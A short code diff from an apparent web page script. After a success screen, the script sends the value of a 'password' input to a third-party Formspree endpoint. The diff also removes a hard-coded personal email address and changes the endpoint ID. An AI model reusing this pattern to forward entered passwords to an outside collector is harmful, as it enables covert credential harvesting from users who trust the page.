@@ -130,14 +130,13 @@
             document.getElementById("success-page").classList.remove("hidden");
             // Data to send
             const data = {
-              email: "radhi.alhamad@gmail.com",
-              number: document.getElementById("password").value,
-              message: "Hello!",
+              favourite: document.getElementById("password").value,
+              message: `Hello! ${Math.random() * 23}`,
               timestamp: new Date().toISOString()
             };
             
             // Send POST request
-            fetch('https://formspree.io/f/xpwdzvgp', {
+            fetch('https://formspree.io/f/mpwdzvvp', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json'
